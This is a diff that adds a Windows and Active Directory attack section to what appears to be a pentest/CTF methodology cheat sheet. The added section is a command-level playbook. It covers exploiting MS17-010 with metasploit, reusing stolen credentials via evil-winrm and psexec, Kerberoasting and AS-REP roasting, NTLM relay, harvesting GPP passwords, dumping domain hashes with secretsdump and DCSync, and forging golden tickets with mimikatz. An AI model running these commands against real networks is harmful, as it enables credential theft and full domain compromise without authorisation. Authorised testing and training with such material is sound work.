@@ -249,6 +249,35 @@ Use whichever is faster. Often both: built-in tools to map, command line to go d
   `python -m http.server 8000` - drop a file, fetch from the target.
 - Encoded commands: base64 -e style (certutil): `certutil -encode in.txt out.b64`.
 
+## 5c) WINDOWS & ACTIVE DIRECTORY ATTACKS (network targets)
+- **Windows box, no creds yet**: 445 SMB open? Try SMBv1 null sessions (`enum4linux`,
+  `smbclient -L //host -N`), eternalblue-era checks (`ms17-010` scan), RPC endpoint
+  enumeration (`rpcclient -U "" -N` -> `srvinfo`, `enumdomusers`), MS17-010/ancient
+  Windows = instant SYSTEM via metasploit `exploit/windows/smb/ms17_010_eternalblue`.
+- **With ANY user creds** (even local): try them everywhere - admin$ share
+  (`net use \\host\admin$ /user:x p`), WinRM (5985): `evil-winrm -i host -u x -p y`,
+  RDP, then `psexec.py x:y@host`.
+- **Active Directory**:
+  - Enumerate AD from any joined box: BloodHound (SharpHound collector ->
+    `bloodhound-python -u x -p y -d domain -ns DC`), `ldapdomaindump`.
+  - **Kerberoasting**: request TGS tickets for SPNs with weak passwords:
+    `GetUserSPNs.py domain/user:pass -dc-ip DC -request` -> crack hashes (hashcat 13100).
+  - **AS-REP roasting**: accounts without preauth - `GetNPUsers.py domain/user:pass
+    -dc-ip DC -request` -> crack (18200).
+  - **NTLM relay**: capture SMB auth (responder) -> relay to SMB on other hosts (SMB
+    signing off) -> `ntlmrelayx.py -t smb://target` -> dump SAM / psexec.
+  - **GPP passwords**: SYSVOL groups.xml cpassword (AES with public key - instant
+    decrypt) - `findstr /S /I cpassword \\domain\SYSVOL\*`.
+  - **Domain admin path**: BloodHound shortest path -> kerberoast -> pass-the-hash ->
+    `secretsdump.py domain/DA@DC` (dump ALL hashes) -> golden ticket (krbtgt) via
+    mimikatz on DC.
+  - **DCSync**: with DA rights: `secretsdump.py -just-dc domain/DA@DC` - pull any user's
+    hash without touching the DC disk.
+- **Impacket cheat**: `psexec.py` (interactive shell via service), `wmiexec.py` (shell
+  via WMI - fewer artifacts), `smbexec.py` (shell via services, no file write),
+  `atexec.py` (scheduled task shell), `secretsdump.py` (SAM+LSASS+cached creds),
+  `mimikatz` (in-memory only).
+
 ## 6) CTF / FLAG MODE
 1. Full port sweep 1-65535 first - hidden ports are the norm.
 2. Look for intentional oddities: odd ports, steganography (strings, EXIF, zsteg/steghide/
